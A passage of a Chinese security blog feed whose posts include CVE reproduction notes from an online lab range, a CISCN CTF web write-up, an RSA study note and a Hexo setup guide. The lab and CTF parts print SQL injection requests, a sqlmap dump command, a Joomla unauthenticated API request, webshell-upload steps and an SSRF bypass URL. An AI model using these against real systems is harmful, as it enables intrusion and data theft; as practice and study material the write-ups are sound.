Jun_username=448a%2FDAUS9%2BjbArOFBaKXNKOjyq3o9XAsGiSxfFFM3Fg4Q; Jun_wz_name=9040bAVI7JjBXVXYg2iX97I7pavJTcfI6QjKTh2B1L7iiw; Jun_siteid=7919eFYF19xwo7FrF3qXu7mfgS1yQb3JNGpK8SE7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708164817210.png" alt="image-20240708164817210"></p><h4 id="CVE-2023-51048"><a href="#CVE-2023-51048" class="headerlink" title="CVE-2023-51048"></a>CVE-2023-51048</h4><blockquote><p>S-CMS v5.0 被发现存在SQLI。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708165122227.png" alt="image-20240708165122227"></p><p><a href="https://www.freebuf.com/vuls/386377.html">S-CMS的代码审计初探</a></p><p>&#x2F;admin访问后台,admin&#x2F;admin123登录，拿到cookie访问&#x2F;admin&#x2F;ajax.php?type&#x3D;bbs&amp;action&#x3D;edit&amp;B_id&#x3D;1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /admin/ajax.php?B_id=1&amp;action=edit&amp;type=bbs HTTP/1.1</span><br><span class="line">Host: eci-2zefbr8mjm2ik0anxf5e.cloudeci1.ichunqiu.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Cookie: authx=; count_all=0; userx=; passx=; user=admin; pass=7b19569b9317927e14152e312767a351; A_type=1; auth=1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1; newsauth=all; productauth=all; textauth=all; formauth=all; bbsauth=all; PHPSESSID=04de0b6947d9287f30a0bf5a261042d9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">B_content=abc&amp;B_sort=2&amp;B_sh=1*&amp;B_time=123&amp;B_title=abc&amp;B_view=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708182308168.png" alt="image-20240708182308168"></p><h4 id="CVE-2023-50564"><a href="#CVE-2023-50564" class="headerlink" title="CVE-2023-50564"></a>CVE-2023-50564</h4><blockquote><p>Pluck-CMS v4.7.18 中的 &#x2F;inc&#x2F;modules_install.php 组件，攻击者可以通过上传一个精心制作的 ZIP 文件来执行任意代码。</p></blockquote><p>login.php admin123登录</p><p>manage modules&#x2F;install a module</p><p>上传一个shell.zip,里面是info.php，内容是一句话木马</p><p>访问&#x2F;data&#x2F;modules&#x2F;shell&#x2F;info.php即可</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708185510845.png" alt="image-20240708185510845"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;春秋云镜靶场练习记录2&quot;&gt;&lt;a href=&quot;#春秋云镜靶场练习记录2&quot; class=&quot;headerlink&quot; title=&quot;春秋云镜靶场练习记录2&quot;&gt;&lt;/a&gt;春秋云镜靶场练习记录2&lt;/h1&gt;&lt;h2 id=&quot;漏洞靶标&quot;&gt;&lt;a href=&quot;#漏洞靶标&quot; class=&quot;</summary>
      
    
    
    
    <category term="靶场练习" scheme="https://blog.xmszzz756.top/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="复现" scheme="https://blog.xmszzz756.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜靶场练习记录1</title>
    <link href="https://blog.xmszzz756.top/2024/07/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://blog.xmszzz756.top/2024/07/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2024-07-07T14:48:32.215Z</published>
    <updated>2024-07-08T05:45:25.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜靶场练习记录1"><a href="#春秋云镜靶场练习记录1" class="headerlink" title="春秋云镜靶场练习记录1"></a>春秋云镜靶场练习记录1</h1><h2 id="漏洞靶标"><a href="#漏洞靶标" class="headerlink" title="漏洞靶标"></a>漏洞靶标</h2><h3 id="免费靶标"><a href="#免费靶标" class="headerlink" title="免费靶标"></a>免费靶标</h3><h4 id="CVE-2022-4230"><a href="#CVE-2022-4230" class="headerlink" title="CVE-2022-4230"></a>CVE-2022-4230</h4><blockquote><p>靶标介绍：</p><p>WP Statistics WordPress 插件13.2.9之前的版本不会转义参数，这可能允许经过身份验证的用户执行 SQL  注入攻击。默认情况下，具有管理选项功能 (admin+) 的用户可以使用受影响的功能，但是该插件有一个设置允许低权限用户也可以访问它。</p></blockquote><p><a href="https://www.cnblogs.com/F12-blog/p/18170169">WordPress CVE-2022-4230复现分析 </a></p><p>打开题目看到icon便能判断为Wordpress，访问&#x2F;admin就能跳转到登录界面</p><p>wordpress可以爆破用户名和密码，但是这里有提示test，同时利用用户信息泄露漏洞也可以知道有哪些用户，密码也是test，笨比字典居然没有test密码</p><p><a href="http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-json/wp/v2/users/">http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-json/wp/v2/users/</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707225922061.png" alt="image-20240707225922061"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707224722600.png" alt="image-20240707224722600"></p><p>登录以后访问<a href="http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce">http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce</a></p><p>不登录是不会得到这个字符串的，只会有一个0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707224916098.png" alt="image-20240707224916098"></p><p>sqlmap启动就完了，让子弹飞一会儿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\sql.txt --batch -D wordpress -T flag -C flag --dump --flush</span><br><span class="line">这里加flush是因为我的nonce换了，所以要清除缓存，以免使用之前的nonce和cookie</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707230408770.png" alt="image-20240707230408770"></p><h4 id="CVE-2023-27179"><a href="#CVE-2023-27179" class="headerlink" title="CVE-2023-27179"></a>CVE-2023-27179</h4><blockquote><p>GDidees CMS v3.9.1及更低版本被发现存在本地文件泄露漏洞，漏洞通过位于 &#x2F;_admin&#x2F;imgdownload.php 的 filename 参数进行利用。</p></blockquote><p>前台没有CMS特征，指纹识别工具也没判断出来</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232017834.png" alt="image-20240707232017834"></p><p>目录扫描到后台，访问可知为GDidees CMS v3.0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232050418.png" alt="image-20240707232050418"></p><p>goole能搜到的Nday还蛮多的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232439182.png" alt="image-20240707232439182"></p><h4 id="CVE-2023-26469"><a href="#CVE-2023-26469" class="headerlink" title="CVE-2023-26469"></a>CVE-2023-26469</h4><blockquote><p>Jorani是一款开源的员工考勤和休假管理系统，适用于中小型企业和全球化组织，它简化了员工工时记录、休假请求和审批流程，并提供了多语言支持以满足不同地区的需求。在 Jorani 1.0.0 中，攻击者可以利用路径遍历来访问文件并在服务器上执行代码。</p></blockquote><p>打开题目就能发现是jorani v1.0.0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232726674.png" alt="image-20240707232726674"></p><p><a href="https://blog.csdn.net/weixin_44304678/article/details/134170020">Jorani远程命令执行漏洞 CVE-2023-26469</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707233923936.png" alt="image-20240707233923936"></p><h4 id="CVE-2023-23752"><a href="#CVE-2023-23752" class="headerlink" title="CVE-2023-23752"></a>CVE-2023-23752</h4><blockquote><p>Joomla是一个开源免费的内容管理系统（CMS），基于PHP开发。在其4.0.0版本到4.2.7版本中，存在一处属性覆盖漏洞，导致攻击者可以通过恶意请求绕过权限检查，访问任意Rest API。</p></blockquote><p>借助wappalyzer插件可以看见指纹是joomla</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707234219786.png" alt="image-20240707234219786"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/index.php/v1/config/application?public=true</span><br></pre></td></tr></table></figure><p>上面的接口找不到，优先找user这类重要性比较高的信息</p><p><a href="https://xz.aliyun.com/t/12175?time__1311=mqmhD5DK7IejhDBdPx2DUh0C34AILLqx&alichlgref=https://t.me/">Joomla未授权访问漏洞(CVE-2023-23752)</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/index.php/v1/users?public=true HTTP/1.1</span><br><span class="line">Host: eci-2zed5tpm2rmi2cqeetlm.cloudeci1.ichunqiu.com</span><br><span class="line">Priority: u=1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: e35f439eaec56252e5f70fd7762ea35a=9a122818dc34e3d77fc210d77469daf9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708000455907.png" alt="image-20240708000455907"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;春秋云镜靶场练习记录1&quot;&gt;&lt;a href=&quot;#春秋云镜靶场练习记录1&quot; class=&quot;headerlink&quot; title=&quot;春秋云镜靶场练习记录1&quot;&gt;&lt;/a&gt;春秋云镜靶场练习记录1&lt;/h1&gt;&lt;h2 id=&quot;漏洞靶标&quot;&gt;&lt;a href=&quot;#漏洞靶标&quot; class=&quot;</summary>
      
    
    
    
    <category term="靶场练习" scheme="https://blog.xmszzz756.top/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="复现" scheme="https://blog.xmszzz756.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>痛苦的密码学</title>
    <link href="https://blog.xmszzz756.top/2024/07/04/%E7%97%9B%E8%8B%A6%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>https://blog.xmszzz756.top/2024/07/04/%E7%97%9B%E8%8B%A6%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6/</id>
    <published>2024-07-04T14:12:04.146Z</published>
    <updated>2024-07-07T16:11:51.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="痛苦的密码学"><a href="#痛苦的密码学" class="headerlink" title="痛苦的密码学"></a>痛苦的密码学</h1><p>师弟和我都上云云老师的这门密码学，今天发来一个题，问我怎么做（我明天下午就要考密码学了）</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704221200467.png" alt="image-20240704221200467"></p><p>恰好23级的师妹Rsa学的比较多，我就开始问师妹，因为我算的也是错的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/1720102391237.png" alt="1720102391237"></p><p>正好简单记录一下，就当复习考试，这题很蠢的是，我和师弟都算的是解密的答案51，但是题目要求我们算加密的密文是多少。。</p><p>么就要算e了，还得学一下Markdown怎么写公式。</p><p>复习了半小时欧几里得求乘法逆元，终于算出来了e是43</p><p>然后要求2^43模77的结果，好好好，再复习一遍高次幂的求法，模幂算法，我和师妹研究半天，都是算错的，最后我让kimi给我生成了个脚本，看脚本看懂了…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def mod_pow(base, exponent, modulus):</span><br><span class="line">    result = 1</span><br><span class="line">    base = base % modulus</span><br><span class="line">    while exponent &gt; 0:</span><br><span class="line">        if exponent % 2 == 1:  # 如果指数是奇数</span><br><span class="line">            result = (result * base) % modulus</span><br><span class="line">        print(exponent)</span><br><span class="line">        exponent = exponent &gt;&gt; 1  # 指数除以2，相当于右移一位</span><br><span class="line">        base = (base * base) % modulus</span><br><span class="line">        print(f&quot;result:&#123;result&#125; \n base:&#123;base&#125; \n exponent:&#123;exponent&#125; \n ==================&quot;)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">#101011</span><br><span class="line"></span><br><span class="line"># 计算2的43次方模77</span><br><span class="line">result = mod_pow(2, 43, 77)</span><br><span class="line">print(f&quot;2的43次方模77的结果是: &#123;result&#125;&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;痛苦的密码学&quot;&gt;&lt;a href=&quot;#痛苦的密码学&quot; class=&quot;headerlink&quot; title=&quot;痛苦的密码学&quot;&gt;&lt;/a&gt;痛苦的密码学&lt;/h1&gt;&lt;p&gt;师弟和我都上云云老师的这门密码学，今天发来一个题，问我怎么做（我明天下午就要考密码学了）&lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="日常" scheme="https://blog.xmszzz756.top/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="密码学" scheme="https://blog.xmszzz756.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>博客搭建记录</title>
    <link href="https://blog.xmszzz756.top/2024/07/04/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://blog.xmszzz756.top/2024/07/04/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2024-07-04T13:48:33.277Z</published>
    <updated>2024-07-15T08:19:34.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="博客搭建记录"><a href="#博客搭建记录" class="headerlink" title="博客搭建记录"></a>博客搭建记录</h1><p><a href="https://blog.xsmzzz756.top/">我的博客</a></p><p>突然心血来潮，想搭建起自己的博客，把平时的Markdown笔记存下来，CSDN属实是不想再用了，文章违规、也不太方便写、平时要用还要登录，但是本地的MD笔记经常清除本地图片或者找不到放哪了，所以感觉还是非常有必要搭建博客来记录自己的学习情况</p><h2 id="方案选择"><a href="#方案选择" class="headerlink" title="方案选择"></a>方案选择</h2><p><a href="https://pdpeng.github.io/2022/01/19/setup-personal-blog/">快速搭建个人博客 —— 保姆级教程 | 攻城狮杰森</a>  </p><p>查资料后了解到两种主流方案：</p><p>1、Hexo + github pages</p><blockquote><p><strong>Hexo</strong> 是一个快速、简单且功能强大的博客框架。你用<strong>Markdown</strong>（或其他标记语言）写帖子，Hexo 会在几秒钟内生成带有漂亮主题的<strong>静态文件</strong></p><p><strong>GitHub Pages</strong>是一种由<strong>GitHub</strong>中的仓库&#x2F;项目直接创建的网页。管理简单，在本地编辑仓库中的内容，上传到GitHub上，GitHub Pages就能快速完成更新，重点是<strong>不花钱，不花钱，不花钱</strong></p></blockquote><p>2、Wordpress</p><blockquote><p>不多说</p></blockquote><p>最后选择了Hexo+github pages</p><p>主要是我不太想管理网站，而且我更喜欢Hexo的主题风格，也没有多余的服务器了属实是，一台作vpn，一台作蜜罐，国内服务器真心感觉备案很烦</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境准备：nodejs + npm + github账号 + vscode + git + 一个良好的网络（我不开加速器访问不上github）</span><br></pre></td></tr></table></figure><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>Hexo常用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- hexo init         # Initializes a website</span><br><span class="line">- hexo new          # Creates a new article</span><br><span class="line">- hexo generate     # Generates static files</span><br><span class="line">- hexo publish      # Publishes a draft</span><br><span class="line">- hexo server       # Starts a local server</span><br><span class="line">- hexo stop         # stop a local server(Ctrl-C)</span><br><span class="line">- hexo deploy       # Deploys your website</span><br><span class="line">- hexo clean        # Cleans the cache file (db.json) and generated files (public)</span><br></pre></td></tr></table></figure><p>Hexo 基础结构</p><blockquote><p>public 最终所见网页的所有内容<br>node_modules 插件以及hexo所需node.js模块<br>_config.yml 站点配置文件，设定一些公开信息等<br>package.json 应用程序信息，配置hexo运行所需js包<br>scaffolds 模板文件夹，新建文章，会默认包含对应模板内容<br>themes 存放主题文件，hexo根据主题生成静态网页（速度贼快）<br>source 用于存放用户资源（除 posts 文件夹，其余命名方式为 “ + 文件名”的文件被忽略）</p></blockquote><p>首先找一个地方来放我们的博客项目</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704214653601.png" alt="image-20240704214653601"></p><p>然后在对应目录下执行下面的命令，就会出现上图部分基础文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><h3 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h3><p><a href="https://hexo.io/themes/">hexo官方主题库</a></p><p>开始找了一些比较中意的主题，但是down下来后，发现自己不太配置的明白，所以就直接用了这个Butterfly，算比较常见和成熟吧。</p><p><a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly安装配置教程</a></p><p>具体配置参考上面这个链接就行，目前我的只完成了一部分，后续还要再研究下</p><h3 id="github的配置"><a href="#github的配置" class="headerlink" title="github的配置"></a>github的配置</h3><p>创建一个仓库，名字为用户名.github.io，最好创建完以后，在仓库中新建一个index.html文件，然后访问看看</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215505464.png" alt="image-20240704215505464"></p><p>Pages下可以详细的配置，这里记住自己的分支，我的是main</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215553046.png" alt="image-20240704215553046"></p><p>在个人账号设置里，获取一下token，第一次创建才会显示，所以要记住</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215839756.png" alt="image-20240704215839756"></p><p>修改hexo项目根目录下的_config.yml</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215943368.png" alt="image-20240704215943368"></p><p>还有一个git的ssh，如果部署项目到github上的时候报错了，可能是这个没有配置，具体步骤忘了</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215804469.png" alt="image-20240704215804469"></p><h3 id="图床配置"><a href="#图床配置" class="headerlink" title="图床配置"></a>图床配置</h3><p>Github + PicGo + jsdelivr的cdn</p><p>复制仓库中的一个图片链接</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220324055.png" alt="image-20240704220324055"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220518717.png" alt="image-20240704220518717"></p><p>jsDelivr会自动转链接</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220552399.png" alt="image-20240704220552399"></p><p>token填开始在github个人账号配置的token</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220405370.png" alt="image-20240704220405370"></p><h3 id="Typora配置"><a href="#Typora配置" class="headerlink" title="Typora配置"></a>Typora配置</h3><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220755930.png" alt="image-20240704220755930"></p><h3 id="写文"><a href="#写文" class="headerlink" title="写文"></a>写文</h3><p>写文在source&#x2F;_posts&#x2F;下写就行了，Typora或者直接VScode写都行</p><p>最后把今天两篇文章一起上传了，网络不通我就上传不成功…</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704222030272.png" alt="image-20240704222030272"></p><h3 id="自定义域名（2024-7-14补充）"><a href="#自定义域名（2024-7-14补充）" class="headerlink" title="自定义域名（2024.7.14补充）"></a>自定义域名（2024.7.14补充）</h3><p>在github仓库设置中找到Pages，将域名填入下面的Custom domain</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714204529276.png" alt="image-20240714204529276"></p><p>在自己域名的托管网站添加CNAME记录，指向原域名bthcls756.github.io</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714204606438.png" alt="image-20240714204606438"></p><h3 id="网站验证"><a href="#网站验证" class="headerlink" title="网站验证"></a>网站验证</h3><p>支持<a href="https://search.google.com/">谷歌</a>、<a href="https://ziyuan.baidu.com/">百度</a>收录网站</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715161922815.png" alt="image-20240715161922815"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715161858119.png" alt="image-20240715161858119"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715161813333.png" alt="image-20240715161813333"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;博客搭建记录&quot;&gt;&lt;a href=&quot;#博客搭建记录&quot; class=&quot;headerlink&quot; title=&quot;博客搭建记录&quot;&gt;&lt;/a&gt;博客搭建记录&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.xsmzzz756.top/&quot;&gt;我的博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="日常" scheme="https://blog.xmszzz756.top/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Hexo" scheme="https://blog.xmszzz756.top/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN西南赛区半决赛Web复现</title>
    <link href="https://blog.xmszzz756.top/2024/07/04/2024-6-21%20ciscn2024%E5%8D%8A%E5%86%B3%20220416/"/>
    <id>https://blog.xmszzz756.top/2024/07/04/2024-6-21%20ciscn2024%E5%8D%8A%E5%86%B3%20220416/</id>
    <published>2024-07-04T10:04:41.834Z</published>
    <updated>2024-07-07T16:12:01.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024全国大学生信息安全竞赛半决赛西南赛区"><a href="#2024全国大学生信息安全竞赛半决赛西南赛区" class="headerlink" title="2024全国大学生信息安全竞赛半决赛西南赛区"></a>2024全国大学生信息安全竞赛半决赛西南赛区</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>awdp赛制升级版（break and fix），web和pwn，比赛分上半场（break环节）和下半场（fix环节），上半场题目仅允许break，下半场选取上半场部分题目进行fix环节，下半场题目仅允许fix。</p><p>3道pwn，7道web（两道java、两道python、三道php），共10题。</p><p>下午选上午5道web题fix，每道题目fix时间为30分钟。每道题只能cheak一次，check脚本将在题目结束后自动运行。</p><h2 id="部分公告"><a href="#部分公告" class="headerlink" title="部分公告"></a>部分公告</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>三十分钟后（14：00整）将关闭当前所有break赛题，请参赛选手做好时间管理。</p><p>fix环节比赛时间为14:00到16:30，总时长为2个半小时，共计5道赛题环境，每道题目fix时间为30分钟。</p><p>注意：每道题只能cheak一次，check脚本将在题目结束后自动运行，各位参赛选手可通过风云榜查看得分情况。</p><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><h4 id="zwphpc"><a href="#zwphpc" class="headerlink" title="zwphpc"></a>zwphpc</h4><p>1.Xml是否可覆盖呢？</p><h4 id="mynote"><a href="#mynote" class="headerlink" title="mynote"></a>mynote</h4><p>1.找找管理员的私人笔记内容</p><h4 id="ezssti"><a href="#ezssti" class="headerlink" title="ezssti"></a>ezssti</h4><p>1.源码可能藏在哪里呢？</p><p>2.模板引擎可能会出什么问题呢？</p><h4 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h4><p>你连接的MySQL服务端真的安全吗？</p><h4 id="zwxajava"><a href="#zwxajava" class="headerlink" title="zwxajava"></a>zwxajava</h4><p>1.系统会对上传的配置文件做什么样的处理呢？</p><p>2.只要给我admin，我就可以得到我想要的</p><p>3.flag.txt文件我可以搜</p><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><p>（1）比赛前，所有参赛选手需将手机、智能手表等通信设备上交至组委会统一保管，赛后统一归还。<br>（2）比赛过程中禁止攻击平台或干扰其他选手正常比赛，禁止对题目场景进行破坏。<br>（3）所有参赛队员（同一队伍的队员除外）禁止使用即时通信软件等渠道与其他人员进行赛题内容沟通交流； 禁止不同队伍之间合作或共享flag、hint等任何比赛相关信息。<br>（4）参赛选手不得私自搭建网络代理将靶场环境进行转发。<br>（5）比赛平台采用严格的反作弊监控机制，对于过程中发现作弊、串题或对比赛平台恶意攻击行为，将采取禁赛、直接取消比赛成绩等处罚措施，情节严重者将由组委会通报参赛队伍所在高校。<br>（6）参赛选手如有竞赛相关问题，可举手向裁判示意，等待裁判到位后进行询问。<br>（7）比赛过程中若发现意外情况，须听从工作人员管理和指挥。<br>（8）比赛结束后20分钟之内提交write-up，文件格式为PDF，文件命名方式”队伍名称.pdf”，例如：zwxa.pdf。<br>（9）write-up有且只能提交一次，提交后团队将无法继续答题。如果比赛过程中某队员自行提交write-up，导致团队无法继续答题，则后果自负。<br>（10）赛场部署360度无死角监控系统，参赛选手不得私自离开比赛区域，若有生理需求请向裁判或工作人员举手示意。<br>（11）参赛选手请基于本地进行录屏，便于后续申诉或仲裁作为相关举证材料。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>mynote无黑盒思路，其他全复现</p><h3 id="ssrf2rce"><a href="#ssrf2rce" class="headerlink" title="ssrf2rce"></a>ssrf2rce</h3><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p>源文件目录</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618171036329.png" alt="image-20240618171036329"></p><p>index.html，只有一个功能点，可跳转至ssrf.php</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618171346979.png" alt="image-20240618171346979"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618171152580.png" alt="image-20240618171152580"></p><p>对GET传参url正则匹配判断，匹配到<a href="http://ciscn.(.*/?)@127.0.0.1/flag.php?look%EF%BC%8C%E7%BB%A7%E7%BB%AD%E4%B8%8B%E4%B8%80%E6%AD%A5%E5%88%A4%E6%96%AD%EF%BC%8C%E4%B8%8D%E5%85%81%E8%AE%B8%E6%9C%89file://%EF%BC%8C%E8%BE%93%E5%87%BA%E8%AF%BB%E5%8F%96fllllllaaaaaaag.php%E7%9A%84%E7%BB%93%E6%9E%9C">http://ciscn.(.*?)@127.0.0.1/flag.php?look，继续下一步判断，不允许有file://，输出读取fllllllaaaaaaag.php的结果</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618171522847.png" alt="image-20240618171522847"></p><p>跟进fllllllaaaaaaag.php提示coooooomand.php，目录扫描flag.php也能得知提示</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618171950587.png" alt="image-20240618171950587"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618172033476.png" alt="image-20240618172033476"></p><p>传参?url&#x3D;<a href="http://ciscn.bthcls@127.0.0.1/flag.php?look">http://ciscn.bthcls@127.0.0.1/flag.php?look</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618172202622.png" alt="image-20240618172202622"></p><p>简单的命令执行，绕过即可</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618172320240.png" alt="image-20240618172320240"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618172341018.png" alt="image-20240618172341018"></p><p>windows复现环境，所以用的windows命令</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618173727918.png" 